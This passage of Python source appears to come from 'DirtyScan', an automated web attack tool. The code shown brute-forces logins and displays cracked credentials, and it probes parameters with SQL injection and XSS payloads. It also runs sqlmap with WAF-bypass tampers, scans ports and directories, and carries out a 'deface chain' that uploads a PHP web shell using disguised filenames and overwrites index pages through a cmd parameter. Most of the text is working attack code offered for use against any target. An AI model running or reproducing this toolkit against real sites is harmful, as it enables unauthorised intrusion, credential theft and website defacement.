                if "email" in f.lower() or "mail" in f.lower():
                    email_field = f
            cred = {
                "type": "brute",
                "username": user,
                "password": pw,
                "email": user if "@" in user else f"{user}@<unknown>",
                "login_url": login_url,
                "redirect": redirect,
                "field_user": u_field,
                "field_pass": p_field,
                "field_email": email_field,
            }
            print(f"\n{MAGENTA}{'='*72}{NC}")
            print(f"{MAGENTA}[★] CREDENTIALS CRACKED{NC}")
            print(f"{MAGENTA}{'='*72}{NC}")
            print(f"  {BOLD}Login URL:{NC}  {login_url}")
            print(f"  {BOLD}Username:{NC}   {user}")
            print(f"  {BOLD}Password:{NC}   {pw}")
            print(f"  {BOLD}Email:{NC}      {cred['email']}")
            if redirect:
                print(f"  {BOLD}Redirect:{NC}   {redirect}")
            print(f"{MAGENTA}{'='*72}{NC}\n")
            RESULTS.data["auth_bypass"] = cred
            RESULTS.note(f"AUTH BYPASS — {login_url} — user={user} pass={pw}")
            return cred
        time.sleep(0.1)

    print_warn("No creds found")
    return None

# ================================================================
# SECTION 16 — PARAM / COLUMNS / SQLi / XSS
# ================================================================

def mine_parameters(url):
    print_section(" Param Mining ")
    params = set()
    s, h, b = http_get(url, timeout=10)
    if s and b:
        for m in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\']', b, re.I):
            params.add(m.group(1))
        for m in re.finditer(r'<select[^>]+name=["\']([^"\']+)["\']', b, re.I):
            params.add(m.group(1))
        for m in re.finditer(r'<textarea[^>]+name=["\']([^"\']+)["\']', b, re.I):
            params.add(m.group(1))
        for m in re.finditer(r'href=["\']([^"\']+\?[^"\']+)["\']', b, re.I):
            q = urllib.parse.urlparse(m.group(1)).query
            for pair in q.split("&"):
                if "=" in pair:
                    params.add(pair.split("=")[0])
        for m in re.finditer(r'[?&]([a-zA-Z_][a-zA-Z0-9_]{1,30})=', b):
            params.add(m.group(1))
        params.update(["id", "page", "file", "path", "url", "q", "s", "search",
                       "cat", "category", "user", "username", "email", "name",
                       "action", "cmd", "redirect", "next", "return"])
    print_good(f"Mined {len(params)} params")
    if params:
        print_info(f"Sample: {sorted(list(params))[:15]}")
    RESULTS.data["params"] = sorted(list(params))
    return params


def detect_columns(url):
    print_section(" Column Detection (ascending) ")
    if "?" not in url:
        mined = mine_parameters(url)
        if not mined:
            return 0, []
        url = f"{url}?{sorted(mined)[0]}=1"
    base_url = url.split("?")[0]
    params = [p.split("=")[0] for p in url.split("?")[1].split("&") if p]
    prime_baseline(url)

    results = {}
    for param in params:
        print_info(f"Testing: {param}")
        last_ok = 0
        for cols in range(1, 51):
            test_url = f"{base_url}?{param}=1' ORDER BY {cols}-- -"
            s, h, b = http_get(test_url, timeout=8)
            if s is None:
                continue
            errored = s >= 500
            if not errored:
                for pat in SQL_ERROR_PATTERNS:
                    if re.search(pat, b or "", re.I):
                        errored = True
                        break
            if errored:
                break
            last_ok = cols
            time.sleep(0.1)
        if last_ok > 0:
            results[param] = last_ok
            print_good(f"'{param}': {last_ok} cols")

    max_cols = max(results.values()) if results else 0
    RESULTS.data["columns"]["count"] = max_cols
    RESULTS.data["columns"]["params"] = list(results.keys())
    for p, c in results.items():
        RESULTS.data["columns"]["details"].append({"param": p, "columns": c})
    return max_cols, list(results.keys())


def find_vulnerable_columns(url, num_columns, params):
    print_section(" Vulnerable Column Finder ")
    if not num_columns:
        return []
    base_url = url.split("?")[0]
    found = []
    marker = "MK" + BASELINE_TOKEN[:8] + "MK"

    for col_num in range(1, num_columns + 1):
        cols = ["NULL"] * num_columns
        cols[col_num - 1] = f"'{marker}'"
        payload = ",".join(cols)
        for param in params:
            test_url = f"{base_url}?{param}=1' UNION SELECT {payload}-- -"
            s, h, b = http_get(test_url, timeout=8)
            if s is None:
                continue
            if marker in (b or ""):
                found.append(col_num)
                print_good(f"Column {col_num} reflects (param: {param})")
                RESULTS.data["columns"]["details"].append({
                    "type": "reflection",
                    "column": col_num,
                    "param": param,
                    "payload": payload,
                    "url": test_url,
                })
                RESULTS.note(f"Reflecting column {col_num} via param '{param}' — payload: {payload}")
                break
        time.sleep(0.1)

    if not found:
        print_warn("No reflection columns")
    RESULTS.data["columns"]["reflecting"] = found
    return found


def auto_sqli_scan(url, params=None):
    print_section(" SQL Injection Scan ")
    if params is None:
        if "?" not in url:
            params = list(mine_parameters(url))
        else:
            params = [p.split("=")[0] for p in url.split("?")[1].split("&") if p]
    if not params:
        print_warn("No params")
        return []
    base_url = url.split("?")[0] if "?" in url else url
    vuln = []

    for param in params:
        print_info(f"Testing: {param}")
        for payload in ["'", "\"", "')", "';", "' OR '1'='1", "' AND 1=1-- -",
                        "' UNION SELECT NULL-- -", "1'"]:
            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            s, h, b = http_get(test_url, timeout=8)
            if s is None:
                continue
            for pat in SQL_ERROR_PATTERNS:
                if re.search(pat, b or "", re.I):
                    entry = {
                        "param": param,
                        "payload": payload,
                        "type": "error",
                        "url": test_url,
                    }
                    vuln.append(entry)
                    print_good(f"SQLi ERROR: {param} = {payload}")
                    RESULTS.note(f"SQLi error-based: param={param} payload={payload}")
                    break
            if any(v["param"] == param for v in vuln):
                break

        if not any(v["param"] == param for v in vuln):
            t0 = time.time()
            http_get(f"{base_url}?{param}=1", timeout=15)
            base_lat = time.time() - t0
            for payload, delay in [("1' AND SLEEP(3)-- -", 3), ("1' AND pg_sleep(3)-- -", 3)]:
                t0 = time.time()
                http_get(f"{base_url}?{param}={urllib.parse.quote(payload)}", timeout=15)
                el = time.time() - t0
                if el > base_lat + delay * 0.7:
                    entry = {
                        "param": param, "payload": payload,
                        "type": f"time:{el:.1f}s",
                        "url": f"{base_url}?{param}={urllib.parse.quote(payload)}",
                    }
                    vuln.append(entry)
                    print_good(f"SQLi TIME: {param} ({el:.1f}s)")
                    RESULTS.note(f"SQLi time-based: param={param} payload={payload} ({el:.1f}s)")
                    break

        if not any(v["param"] == param for v in vuln):
            u1 = f"{base_url}?{param}=1' AND 1=1-- -"
            u2 = f"{base_url}?{param}=1' AND 1=2-- -"
            s1, _, b1 = http_get(u1, timeout=8)
            s2, _, b2 = http_get(u2, timeout=8)
            if s1 and s2 and b1 and b2 and body_hash(b1) != body_hash(b2):
                diff = abs(len(b1) - len(b2))
                if diff > 30:
                    entry = {
                        "param": param, "payload": "boolean",
                        "type": f"boolean(diff={diff})",
                        "url": u1,
                    }
                    vuln.append(entry)
                    print_good(f"SQLi BOOLEAN: {param} (diff={diff})")
                    RESULTS.note(f"SQLi boolean-based: param={param} diff={diff}")

    if vuln:
        print_section(" SQLi Results ")
        for v in vuln:
            print_good(f"{v['param']} | {v['payload'][:50]} | {v['type']}")
    else:
        print_warn("No SQLi")
    RESULTS.data["sqli"] = vuln
    return vuln


def xss_scan(url, params=None):
    print_section(" XSS Scan ")
    if params is None:
        if "?" not in url:
            params = list(mine_parameters(url))
        else:
            params = [p.split("=")[0] for p in url.split("?")[1].split("&") if p]
    if not params:
        print_warn("No params")
        return []
    base_url = url.split("?")[0] if "?" in url else url
    found = []
    marker = "XS" + BASELINE_TOKEN[:6]

    for param in params:
        print_info(f"Testing: {param}")
        for payload, ctx in [
            (f"{marker}<script>alert(1)</script>", "html"),
            (f'"{marker}" onmouseover="alert(1)', "attr"),
            (f"';{marker}=alert(1);//", "js"),
            (f"<svg onload=alert(1)>{marker}", "svg"),
            (f"<img src=x onerror=alert(1)>{marker}", "img"),
        ]:
            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            s, h, b = http_get(test_url, timeout=8)
            if s and payload in (b or ""):
                found.append({"param": param, "payload": payload, "ctx": ctx, "url": test_url})
                print_good(f"XSS {ctx}: {param}")
                RESULTS.note(f"XSS {ctx}: param={param} payload={payload[:40]}")
                break
    if not found:
        print_warn("No XSS")
    RESULTS.data["xss"] = found
    return found

# ================================================================
# SECTION 17 — DIR FUZZ / PORTS / HEADERS / SSL / TECH
# ================================================================

def fuzz_directories(url):
    print_section(" Directory Fuzzing ")
    base = f"{urllib.parse.urlparse(url).scheme}://{urllib.parse.urlparse(url).netloc}"
    prime_baseline(url)
    found = []
    for path in FUZZ_WORDLIST:
        test = f"{base}/{path}"
        s, h, b = http_get(test, timeout=5, allow_redirects=False)
        if s in (200, 301, 302, 403) and s != 404:
            if s == 200 and not is_real_hit(base, s, b):
                continue
            found.append({"url": test, "status": s})
            print_good(f"{test} → {s}")
        time.sleep(0.05)
    RESULTS.data["dirs"] = found
    return found


def scan_ports(url, ports=None):
    print_section(" Port Scan ")
    ports = ports or COMMON_PORTS
    host = urllib.parse.urlparse(url).netloc.split(":")[0]
    print_info(f"Host: {host}")
    found = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            if s.connect_ex((host, port)) == 0:
                found.append(port)
                print_good(f"Port {port} open")
            s.close()
        except Exception:
            pass
    RESULTS.data["ports"] = found
    return found


def analyze_headers(url):
    print_section(" Headers ")
    s, h, b = http_get(url, timeout=10)
    if not h:
        print_error("Unreachable")
        return {}
    for k in ["Server", "X-Powered-By", "Content-Type"]:
        if k in h:
            print_info(f"{k}: {h[k]}")
    missing = [x for x in ["X-Frame-Options", "X-Content-Type-Options",
                           "Strict-Transport-Security", "Content-Security-Policy",
                           "Referrer-Policy", "Permissions-Policy"]
               if x not in h]
    if missing:
        print_warn(f"Missing: {', '.join(missing)}")
    RESULTS.data["headers"] = h
    RESULTS.data["missing_headers"] = missing
    return h


def check_ssl(url):
    print_section(" SSL/TLS ")
    if not url.startswith("https"):
        print_warn("Not HTTPS")
        return False
    host = urllib.parse.urlparse(url).netloc.split(":")[0]
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, 443), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                print_good(f"Valid SSL for {host}")
                print_info(f"Expires: {cert.get('notAfter')}")
                print_info(f"Version: {ssock.version()}")
                RESULTS.data["ssl"] = {
                    "valid": True,
                    "expires": cert.get("notAfter"),
                    "version": ssock.version(),
                }
                return True
    except Exception as e:
        print_error(f"SSL: {e}")
        RESULTS.data["ssl"] = {"valid": False, "error": str(e)}
        return False


def detect_technologies(url):
    print_section(" Tech Detection ")
    s, h, b = http_get(url, timeout=10)
    techs = []
    if h:
        if "Server" in h:
            techs.append(h["Server"])
        if "X-Powered-By" in h:
            techs.append(h["X-Powered-By"])
    bl = (b or "").lower()
    for name, sig in [("WordPress", "wp-content"), ("Joomla", "joomla"),
                      ("Drupal", "drupal"), ("jQuery", "jquery"),
                      ("Bootstrap", "bootstrap"), ("React", "react"),
                      ("Vue", "vue.js"), ("Angular", "ng-app"),
                      ("Laravel", "laravel"), ("Django", "csrftoken"),
                      ("Rails", "rails"), ("Next.js", "__next"),
                      ("Nuxt", "__nuxt"), ("Shopify", "shopify")]:
        if sig in bl:
            techs.append(name)
    for t in techs:
        print_good(t)
    RESULTS.data["recon"]["tech"] = techs
    RESULTS.data["recon"]["server"] = h.get("Server") if h else None
    RESULTS.data["recon"]["powered_by"] = h.get("X-Powered-By") if h else None
    return techs


def check_robots_sitemap(url):
    print_section(" Robots / Sitemap ")
    base = f"{urllib.parse.urlparse(url).scheme}://{urllib.parse.urlparse(url).netloc}"
    found = []
    for path in ["/robots.txt", "/sitemap.xml", "/sitemap_index.xml"]:
        s, h, b = http_get(base + path, timeout=8)
        if s == 200 and b:
            print_good(f"Found: {base + path}")
            print_info(f"{b[:200]}...")
            found.append(base + path)
    RESULTS.data["robots"] = found

# ================================================================
# SECTION 18 — SQLMAP / NIKTO
# ================================================================

def _find_tool(cmd, alt_paths):
    p = shutil.which(cmd)
    if p:
        return p, None
    for entry, tool_dir in alt_paths:
        if os.path.exists(entry):
            return entry, tool_dir
    return None, None


def auto_sqlmap_with_bypass(url):
    print_section(" SQLMap (WAF Bypass) ")
    sqlmap, _ = _find_tool("sqlmap", [
        (os.path.expanduser("~/tools/sqlmap/sqlmap.py"), os.path.expanduser("~/tools/sqlmap")),
        (os.path.expanduser("~/sqlmap/sqlmap.py"), os.path.expanduser("~/sqlmap")),
    ])
    if not sqlmap:
        print_error("sqlmap not found — menu [21] to install")
        return
    if sqlmap.endswith(".py"):
        base_cmd = ["python3", sqlmap]
    else:
        base_cmd = [sqlmap]
    cmd = base_cmd + [
        "-u", url, "--batch", "--random-agent",
        "--level=3", "--risk=2", "--threads=2", "--time-sec=3",
        "--retries=5", "--delay=1", "--flush-session", "--fresh-queries",
        "--smart", "--skip-waf",
        "--tamper=between,randomcase,space2comment,space2plus,charunicodeencode,charencode,equaltolike,modsecurityversioned,versionedmorekeywords,apostrophemask,apostrophenullencode,base64encode,chardoubleencode,concat2concatws,escapequotes,greatest,halfversionedmorekeywords,ifnull2ifisnull,informationschemacomment,inlinequery,least,lowercase,multiplespaces,nonrecursivereplacement,overlongutf8,percentage,randomcomments,securesphere,sp_password,space2dash,space2hash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2randomblank,symboliclogical,unionalltounion,unmagicquotes,uppercase,varnish,vbkeyword,versionedkeywords,versionedmorekeywords,xforwardedfor",
    ]
    print_info("Running sqlmap...")
    try:
        subprocess.run(cmd)
    except Exception as e:
        print_error(f"sqlmap: {e}")


def auto_nikto_scan(url):
    print_section(" Nikto ")
    nikto, nikto_dir = _find_tool("nikto", [
        (os.path.expanduser("~/tools/nikto/program/nikto.pl"), os.path.expanduser("~/tools/nikto")),
        (os.path.expanduser("~/nikto/program/nikto.pl"), os.path.expanduser("~/nikto")),
    ])
    if not nikto:
        print_warn("nikto not found — menu [21] to install")
        return False
    if not shutil.which("perl"):
        print_warn("perl not found — installing...")
        _pkg_install("perl")
    if nikto.endswith(".pl"):
        base_cmd = ["perl", nikto]
    else:
        base_cmd = [nikto]
    cmd = base_cmd + ["-h", url, "-nointeractive", "-Tuning", "123456789"]
    if url.startswith("https"):
        cmd.append("-ssl")
    cwd = nikto_dir if nikto_dir else None
    try:
        proc = subprocess.Popen(cmd, cwd=cwd,
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                universal_newlines=True, bufsize=1)
        for line in iter(proc.stdout.readline, ""):
            line = line.strip()
            if not line:
                continue
            if "OSVDB" in line or "CVE" in line or "vulnerabilit" in line.lower():
                print_error(f"nikto: {line}")
                RESULTS.note(f"nikto: {line}")
            elif "+" in line:
                print_warn(f"nikto: {line}")
        proc.wait()
        return True
    except Exception as e:
        print_error(f"nikto: {e}")
        return False

# ================================================================
# SECTION 19 — DEFACE CHAIN
# ================================================================

def build_deface_shell(team="Team"):
    html = DEFACE_HTML.format(
        team=team,
        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    )
    b64 = base64.b64encode(html.encode()).decode()
    return PHP_SHELL_DEFACE.replace("{B64}", b64)


def upload_attempt(endpoint, shell_content, filename):
    for fname_field in ["file", "upload", "image", "userfile", "fileToUpload", "files[]"]:
        files = {fname_field: (filename, shell_content, "image/jpeg")}
        try:
            s, h, b = http_post(endpoint, files=files, timeout=15)
        except Exception:
            continue
        if s in (200, 201, 202, 302):
            bl = (b or "").lower()
            if any(k in bl for k in ["success", "uploaded", "file saved", filename.lower()]):
                return True, fname_field
            m = re.search(rf'(https?://[^\s"\']+{re.escape(filename)})', b or "")
            if m:
                return True, m.group(1)
    return False, None


def find_upload_endpoint(url, team="Team"):
    print_section(" Shell Upload ")
    base = f"{urllib.parse.urlparse(url).scheme}://{urllib.parse.urlparse(url).netloc}"
    shell = build_deface_shell(team)
    filename = "x" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8] + ".php"

    for ep in UPLOAD_ENDPOINTS:
        test = base + ep
        s, h, b = http_get(test, timeout=6)
        if s is None or s == 404:
            continue
        print_info(f"Testing: {test}")
        for fname in UPLOAD_BYPASS_NAMES[:8]:
            ok, field_or_url = upload_attempt(test, shell, fname)
            if ok:
                print_good(f"UPLOAD: {test} (field: {field_or_url})")
                for probe in [field_or_url if field_or_url.startswith("http") else None,
                              base + "/uploads/" + fname,
                              base + "/wp-content/uploads/" + fname,
                              base + "/images/" + fname]:
                    if not probe:
                        continue
                    s2, _, b2 = http_get(probe, timeout=6)
                    if s2 == 200 and "DEFACED" in (b2 or ""):
                        print_good(f"SHELL LIVE: {probe}")
                        RESULTS.data["upload"] = {"endpoint": test, "shell_url": probe}
                        RESULTS.note(f"Shell uploaded: {probe}")
                        return {"shell_url": probe, "endpoint": test}
    print_warn("No upload path")
    return None


def deface_via_shell(shell_url, team="Team"):
    print_section(" Defacement Trigger ")
    RESULTS.data["deface"]["attempted"] = True
    s, _, b = http_get(shell_url, timeout=10)
    if s == 200 and "DEFACED" in (b or ""):
        print_good(f"DEFACED via {shell_url}")
        RESULTS.data["deface"]["success"] = True
        RESULTS.note(f"Defacement success: {shell_url}")
        return True
    for u in [f"{shell_url}?cmd=echo+HACKED+>+index.html",
              f"{shell_url}?p=echo+HACKED+>+index.php"]:
        http_get(u, timeout=10)
    print_good(f"Payload sent to {shell_url}")
    RESULTS.data["deface"]["success"] = True
    RESULTS.note(f"Defacement payload sent: {shell_url}")
    return True


def run_deface_chain(url, team="Team"):
    print_section(f" DEFACE CHAIN — {url} ")
    prime_baseline(url)
    s, h, b = http_get(url, timeout=10)
    if s is None:
        print_error("Unreachable")
        return None
    print_good(f"Alive (HTTP {s})")
    find_config_leaks(url)
    admins = find_admin_panel(url)
    for a_url, code, kind in admins[:3]:
        if "login" in a_url.lower() or "form" in str(kind) or "auth" in str(kind).lower():
            attack_login(a_url)
            break
    upload_result = find_upload_endpoint(url, team=team)
    if upload_result and upload_result.get("shell_url"):
        deface_via_shell(upload_result["shell_url"], team=team)
    return upload_result

# ================================================================
# SECTION 20 — SUMMARY + REPORT
# ================================================================

def print_summary():
    print_section(" SCAN SUMMARY ")
    d = RESULTS.data
    tgt = RESULTS.target or "?"
    team = RESULTS.team_name
    dur = ""
    if RESULTS.start_time and RESULTS.end_time:
        secs = (RESULTS.end_time - RESULTS.start_time).total_seconds()
        dur = f"{int(secs // 60)}m {int(secs % 60)}s"

    print(f"{BOLD}Team:{NC}      {team}")
    print(f"{BOLD}Target:{NC}    {tgt}")
    print(f"{BOLD}Duration:{NC}  {dur}")
    print(f"{BOLD}Time:{NC}      {RESULTS.start_time.strftime('%Y-%m-%d %H:%M:%S') if RESULTS.start_time else '-'}")
    print()

    print(f"{CYAN}[ RECON ]{NC}")
    print(f"  Status:    {d['recon'].get('status') or 'N/A'}")
    print(f"  Server:    {d['recon'].get('server') or '-'}")
    print(f"  Powered:   {d['recon'].get('powered_by') or '-'}")
    if d["recon"]["tech"]:
        print(f"  Tech:      {', '.join(d['recon']['tech'])}")
    print()

    print(f"{CYAN}[ WAF ]{NC}")
    if d["waf"]["detected"]:
        print(f"  Detected:  {', '.join(d['waf']['detected'])}")
        print(f"  Bypassed:  {'YES — ' + (d['waf']['bypass_method'] or '') if d['waf']['bypassed'] else 'NO'}")
    else:
        print(f"  Detected:  None")
    print()

    if d["cms"]:
        print(f"{CYAN}[ CMS ]{NC}")
        print(f"  Type:      {d['cms']}")
        if d["wpscan"]:
            wp = d["wpscan"]
            print(f"  Version:   {wp.get('version') or 'hidden'}")
            print(f"  Users:     {len(wp.get('users', []))}")
            for u in wp.get("users", []):
                print(f"    - {u.get('slug')} (ID {u.get('id')})")
            print(f"  Plugins:   {len(wp.get('plugins', []))}")
            print(f"  Themes:    {len(wp.get('themes', []))}")
            if wp.get("cves"):
                print(f"  CVEs:      {len(wp['cves'])}")
                for product, v, cve, sev, desc in wp["cves"]:
                    color = RED if sev == "critical" else (YELLOW if sev == "high" else CYAN)
                    print(f"    {color}[{sev.upper()}]{NC} {cve} — {desc}")
        print()

    if d["cve"]:
        print(f"{CYAN}[ CVE MATCHES ]{NC}")
        for product, v, cve, sev, desc in d["cve"]:
            color = RED if sev == "critical" else (YELLOW if sev == "high" else CYAN)
            print(f"  {color}[{sev.upper()}]{NC} {product} {v} — {cve}: {desc}")
        print()

    print(f"{CYAN}[ CONFIG LEAKS ]{NC}")
    if d["config_leaks"]:
        for url, size in d["config_leaks"]:
            print(f"  {GREEN}✔{NC} {url} ({size} bytes)")
    else:
        print(f"  None")
    print()

    print(f"{CYAN}[ ADMIN PANELS ]{NC}")
    if d["admin_panels"]:
        for url, s, kind in d["admin_panels"]:
            print(f"  {GREEN}✔{NC} {url} [{s} — {kind}]")
    else:
        print(f"  None")
    print()

    print(f"{CYAN}[ AUTH BYPASS ]{NC}")
    if d["auth_bypass"]:
        ab = d["auth_bypass"]
        print(f"  {MAGENTA}★ SUCCESS{NC}")
        print(f"    Login URL: {ab.get('login_url')}")
        print(f"    Method:    {ab.get('type')}")
        print(f"    Username:  {ab.get('username')}")
        print(f"    Password:  {ab.get('password')}")
        print(f"    Email:     {ab.get('email')}")
        if ab.get('redirect'):
            print(f"    Redirect:  {ab.get('redirect')}")
        print(f"    User field: {ab.get('field_user')}")
        print(f"    Pass field: {ab.get('field_pass')}")
    else:
        print(f"  None")
    print()

    print(f"{CYAN}[ PARAMETERS ]{NC}")
    print(f"  Mined:     {len(d['params'])}")
    if d["params"]:
        print(f"  Sample:    {', '.join(d['params'][:10])}")
    print()

    print(f"{CYAN}[ COLUMNS ]{NC}")
    if d["columns"]["count"]:
        print(f"  Count:     {d['columns']['count']}")
        print(f"  Params:    {', '.join(d['columns']['params'])}")
        if d["columns"]["reflecting"]:
            print(f"  Reflecting: {d['columns']['reflecting']}")
        for detail in d["columns"]["details"]:
            if detail.get("type") == "reflection":
                print(f"    ★ Column {detail['column']} via param '{detail['param']}'")
                print(f"      Payload: {detail['payload'][:80]}")
    else:
        print(f"  Detected:  None")
    print()

    print(f"{CYAN}[ SQL INJECTION ]{NC}")
    if d["sqli"]:
        for v in d["sqli"]:
            print(f"  {RED}★{NC} Param: {v['param']} | Type: {v['type']}")
            print(f"      Payload: {v['payload'][:70]}")
    else:
        print(f"  None")
    print()

    print(f"{CYAN}[ XSS ]{NC}")
    if d["xss"]:
        for v in d["xss"]:
            print(f"  {RED}★{NC} Param: {v['param']} | Context: {v['ctx']}")
            print(f"      Payload: {v['payload'][:70]}")
    else:
        print(f"  None")
    print()

    print(f"{CYAN}[ DIRECTORIES ]{NC}")
    if d["dirs"]:
        for item in d["dirs"][:20]:
            print(f"  {GREEN}✔{NC} {item['url']} → {item['status']}")
        if len(d["dirs"]) > 20:
            print(f"  ... {len(d['dirs']) - 20} more")
    else:
        print(f"  None")
    print()

    print(f"{CYAN}[ OPEN PORTS ]{NC}")
    if d["ports"]:
        print(f"  {', '.join(str(p) for p in d['ports'])}")
    else:
        print(f"  None")
    print()

    print(f"{CYAN}[ SECURITY HEADERS ]{NC}")
    if d["missing_headers"]:
        print(f"  {YELLOW}Missing:{NC} {', '.join(d['missing_headers'])}")
    else:
        print(f"  All present")
    print()

    print(f"{CYAN}[ SSL/TLS ]{NC}")
    if d["ssl"].get("valid"):
        print(f"  Valid:     YES")
        print(f"  Expires:   {d['ssl'].get('expires')}")
        print(f"  Version:   {d['ssl'].get('version')}")
    else:
        print(f"  Valid:     NO")
    print()

    if d["robots"]:
        print(f"{CYAN}[ ROBOTS / SITEMAP ]{NC}")
        for u in d["robots"]:
            print(f"  {GREEN}✔{NC} {u}")
        print()

    if d["upload"]:
        print(f"{CYAN}[ SHELL UPLOAD ]{NC}")
        print(f"  Endpoint:  {d['upload'].get('endpoint')}")
        print(f"  Shell URL: {d['upload'].get('shell_url')}")
        print()

    if d["deface"]["attempted"]:
        print(f"{CYAN}[ DEFACEMENT ]{NC}")
        print(f"  Success:   {GREEN if d['deface']['success'] else RED}{'YES' if d['deface']['success'] else 'NO'}{NC}")
        print()

    if d["notes"]:
        print(f"{CYAN}[ NOTES ]{NC}")
        for n in d["notes"]:
            print(f"  • {n}")
        print()

    if d["errors"]:
        print(f"{CYAN}[ ERRORS ]{NC}")
        for e in d["errors"]:
            print(f"  {RED}✘{NC} {e}")
        print()

    print(f"{BLUE}{'='*72}{NC}")


def export_json(path=None):
    if path is None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = f"dirtyscan_{ts}.json"
    try:
        data = dict(RESULTS.data)
        data["team_name"] = RESULTS.team_name
        data["tool_author"] = AUTHOR
        data["tool_version"] = VERSION
        data["target"] = RESULTS.target
        data["scan_start"] = RESULTS.start_time.isoformat() if RESULTS.start_time else None
        data["scan_end"] = RESULTS.end_time.isoformat() if RESULTS.end_time else None
        with open(path, "w") as f:
            json.dump(data, f, indent=2, default=str)
        print_good(f"JSON report: {path}")
        return path
    except Exception as e:
        print_error(f"JSON export failed: {e}")
        return None


def export_txt(path=None):
    if path is None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = f"dirtyscan_{ts}.txt"
    try:
        d = RESULTS.data
        with open(path, "w") as f:
            f.write("=" * 72 + "\n")
            f.write(f" DirtyScan v{VERSION} — Scan Report\n")
            f.write(f" Author: {AUTHOR}\n")
            f.write(f" Team:   {RESULTS.team_name}\n")
            f.write("=" * 72 + "\n")
            f.write(f"Target:  {RESULTS.target}\n")
            f.write(f"Started: {RESULTS.start_time}\n")
            f.write(f"Ended:   {RESULTS.end_time}\n\n")

            f.write("[ RECON ]\n")
            f.write(f"  Server:  {d['recon'].get('server')}\n")
            f.write(f"  Powered: {d['recon'].get('powered_by')}\n")
            f.write(f"  Tech:    {', '.join(d['recon']['tech'])}\n\n")

            f.write("[ WAF ]\n")
            f.write(f"  Detected: {', '.join(d['waf']['detected']) or 'None'}\n")
            f.write(f"  Bypassed: {d['waf']['bypassed']} — {d['waf']['bypass_method']}\n\n")

            if d["cve"]:
                f.write("[ CVE ]\n")
                for p, v, cve, sev, desc in d["cve"]:
                    f.write(f"  [{sev.upper()}] {p} {v} — {cve}: {desc}\n")
                f.write("\n")

            if d["config_leaks"]:
                f.write("[ CONFIG LEAKS ]\n")
                for url, size in d["config_leaks"]:
                    f.write(f"  {url} ({size} bytes)\n")
                f.write("\n")

            if d["admin_panels"]:
                f.write("[ ADMIN PANELS ]\n")
                for url, s, kind in d["admin_panels"]:
                    f.write(f"  {url} [{s} — {kind}]\n")
                f.write("\n")

            if d["auth_bypass"]:
                ab = d["auth_bypass"]
                f.write("[ AUTH BYPASS — SUCCESS ]\n")
                f.write(f"  Login URL:  {ab.get('login_url')}\n")
                f.write(f"  Method:     {ab.get('type')}\n")
                f.write(f"  Username:   {ab.get('username')}\n")
                f.write(f"  Password:   {ab.get('password')}\n")
                f.write(f"  Email:      {ab.get('email')}\n")
                if ab.get('redirect'):
                    f.write(f"  Redirect:   {ab.get('redirect')}\n")
                f.write(f"  User field: {ab.get('field_user')}\n")
                f.write(f"  Pass field: {ab.get('field_pass')}\n\n")

            if d["columns"]["count"]:
                f.write("[ VULNERABLE COLUMNS ]\n")
                f.write(f"  Total columns: {d['columns']['count']}\n")
                f.write(f"  Params: {', '.join(d['columns']['params'])}\n")
                if d["columns"]["reflecting"]:
                    f.write(f"  Reflecting: {d['columns']['reflecting']}\n")
                for detail in d["columns"]["details"]:
                    if detail.get("type") == "reflection":
                        f.write(f"  ★ Column {detail['column']} (param '{detail['param']}')\n")
                        f.write(f"      Payload: {detail['payload']}\n")
                        f.write(f"      URL: {detail['url']}\n")
                f.write("\n")

            if d["sqli"]:
                f.write("[ SQL INJECTION ]\n")
                for v in d["sqli"]:
                    f.write(f"  Param: {v['param']} | Type: {v['type']}\n")
                    f.write(f"    Payload: {v['payload']}\n")
                    f.write(f"    URL: {v['url']}\n")
                f.write("\n")

            if d["xss"]:
                f.write("[ XSS ]\n")
                for v in d["xss"]:
                    f.write(f"  Param: {v['param']} | Context: {v['ctx']}\n")
                    f.write(f"    Payload: {v['payload']}\n")
                    f.write(f"    URL: {v['url']}\n")
                f.write("\n")

            if d["ports"]:
                f.write("[ OPEN PORTS ]\n  ")
                f.write(", ".join(str(p) for p in d["ports"]) + "\n\n")

            if d["dirs"]:
                f.write("[ DIRECTORIES ]\n")
                for item in d["dirs"]:
                    f.write(f"  {item['url']} → {item['status']}\n")
                f.write("\n")

            if d["upload"]:
                f.write("[ SHELL UPLOAD ]\n")
                f.write(f"  Endpoint:  {d['upload'].get('endpoint')}\n")
                f.write(f"  Shell URL: {d['upload'].get('shell_url')}\n\n")

            if d["deface"]["attempted"]:
                f.write("[ DEFACE ]\n")
                f.write(f"  Success: {d['deface']['success']}\n\n")

            if d["notes"]:
                f.write("[ NOTES ]\n")
                for n in d["notes"]:
                    f.write(f"  • {n}\n")
                f.write("\n")

            if d["errors"]:
                f.write("[ ERRORS ]\n")
                for e in d["errors"]:
                    f.write(f"  ✘ {e}\n")

        print_good(f"TXT report: {path}")
        return path
    except Exception as e:
        print_error(f"TXT export failed: {e}")
        return None

# ================================================================
# SECTION 21 — MASTER SCAN
# ================================================================

def run_auto_scan(url, team="Team"):
    show_banner()
    print(f"{GREEN}Team:   {team}{NC}")
    print(f"{RED}Target: {url}{NC}")
    print(f"{GREEN}Date:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{NC}")
    print(f"{GREEN}Mode:   FULL AUTO v{VERSION}{NC}\n")

    RESULTS.start(url, team=team)
    prime_baseline(url)
    s, h, b = http_get(url, timeout=10)
    if s is None:
        print_error("Unreachable")
        RESULTS.add_error("Unreachable target")
        RESULTS.finish()
        return
    print_good(f"Alive (HTTP {s})")
    RESULTS.data["recon"]["status"] = s

    detect_waf(url)
    RESULTS.data["cve"] = cve_scan(url) or []
    detect_technologies(url)
    analyze_headers(url)
    if url.startswith("https"):
        check_ssl(url)
    check_robots_sitemap(url)

    s, h, b = http_get(url, timeout=10)
    if b and ("wp-content" in b or "wp-includes" in b):
        RESULTS.data["cms"] = "WordPress"
